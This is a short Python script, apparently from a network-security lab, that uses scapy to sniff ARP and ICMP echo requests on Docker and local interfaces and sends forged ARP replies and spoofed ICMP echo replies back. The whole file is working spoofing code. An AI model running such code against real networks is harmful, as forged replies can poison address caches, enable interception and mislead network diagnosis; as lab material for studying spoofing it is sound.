#!/usr/bin/env python3

from scapy.all import *
# this function create a packet base on the information that been sniffed
# and spoof a packet with the right information
def spoof_the_pkt(pkt):
    # if the sniffer sniffed an arp packet request
    if pkt.haslayer(ARP) and pkt[ARP].op == 1:
        print("spoof packet information:")
        # create new arp replay and fill it 
        arp = ARP(op = 2, psrc = pkt[ARP].pdst , pdst = pkt[ARP].psrc , ptype = pkt[ARP].ptype,plen = pkt[ARP].plen, hwlen = pkt[ARP].hwlen, hwtype = pkt[ARP].hwtype , hwdst = pkt[ARP].hwsrc )
        send(arp)
        print("send arp replay")
        # if the sniffer sniffed an icmp packet request
    elif pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        print("spoof packet information:")
        print("original src is:" ,pkt[IP].src)
        print("original dst is:" ,pkt[IP].dst)
        ip = IP(src = pkt[IP].dst , dst = pkt[IP].src, ihl = pkt[IP].ihl)
        # create an icmp headear 
        icmp = ICMP(type = 0, id = pkt[ICMP].id, seq = pkt[ICMP].seq)
        # if the packet have data part , copy it to the spoofed packet
        if pkt.haslayer(Raw):
            data = pkt[Raw].load
            p = ip/icmp/data
        else:
            p = ip/icmp
        send(p)
        print("send icmp echo replay")
        print("new src is:" ,p[IP].src)
        print("new dst is:" ,p[IP].dst)
        print("........")
pkt = sniff(iface=['docker0', 'enp0s3','br-b371452b513c','lo'], filter='icmp or arp', prn=spoof_the_pkt)  

